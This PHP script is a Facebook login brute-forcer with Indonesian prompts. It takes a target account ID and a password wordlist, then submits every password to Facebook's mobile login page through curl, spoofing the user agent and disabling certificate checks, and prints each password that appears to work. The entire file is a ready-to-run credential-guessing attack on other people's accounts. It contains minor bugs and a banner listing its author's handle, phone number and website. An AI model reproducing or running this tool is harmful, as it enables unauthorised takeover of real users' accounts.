<?php
error_reporting(0);
/*
  * Facebook BruteForce
  * 30 Oktober 2020
*/
function check($user, $pass) {
	$fileua = 'user-agents.txt';
	$useragent = $fileua[rand(0, count($fileua) - 1)];
	$cookie = 'cookie.txt';
	touch($cookie);
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass.'&login=Login');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
	curl_setopt($ch, CURLOPT_REFERER, 'http://m.facebook.com');
	$output = curl_exec($ch) or die('Can\'t access '.$url);
	if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
		return TRUE;
	} else {
		return FALSE;
	}
}
$nc="\e[0m";
$white="\e[1;37m";
$black="\e[0;30m";
$blue="\e[0;34m";
$light_blue="\e[1;34m";
$green="\e[0;32m";
$light_green="\e[1;32m";
$cyan="\e[0;36m";
$light_cyan="\e[1;36m";
$red="\e[0;31m";
$light_red="\e[1;31m";
$purple="\e[0;35m";
$light_purple="\e[1;35m";
$brown="\e[0;33m";
$yellow="\e[1;33m";
$gray="\e[0;30m";
$light_gray="\e[0;37m";
$banner = $cyan." 

".$red."[".$blue."  Coded by    : ".$green."ZeroXGhost1337                     ".$white."]
".$red."[".$blue."  Team        : ".$green."IGE-Crew 1337                      ".$white."]
".$red."[".$blue."  Thanks To   : ".$green."My Friends                         ".$white."]
".$red."[".$blue."  Github      : ".$green."https://github.com/zeroxghost1337  ".$white."]
".$red."[".$blue."  Nomor WA    : ".$green."085718790245                       ".$white."]
".$red."[".$blue."  My Website  : ".$green."https://zeroxghost.top             ".$white."]\n\n".$nc;
$file = $_SERVER[argv][1];
echo "$cyan [+] Masukkan ID Target:$yellow ";
$user = trim(fgets(STDIN));
echo "$cyan [+] Tulis wordlist kamu.txt:$yellow ";
$wordlist = trim(fgets(STDIN));
if(!empty($user) && !empty($wordlist)) {
	$passlist = file($wordlist);
	$passcount = count($passlist);
	print $banner;
	print "Tersedia ".$yellow.$passcount." Password untuk bahan cracking! tunggu...\n".$nc;
	foreach($passlist as $password) {
		$pass = substr($password, 0, strlen($password) - 1);
		if(check(urlencode($user), urlencode($pass))) {
			print $pass." [•] ".$cyan."Horeee berhasil\n".$nc;
		} else {
			print $pass." [•] ".$red."Login gagal :'(\n".$nc;
		}
	}
} else {
	print $banner;
	print "
Usage: php ".$file." [username] [wordlist]";
}
?>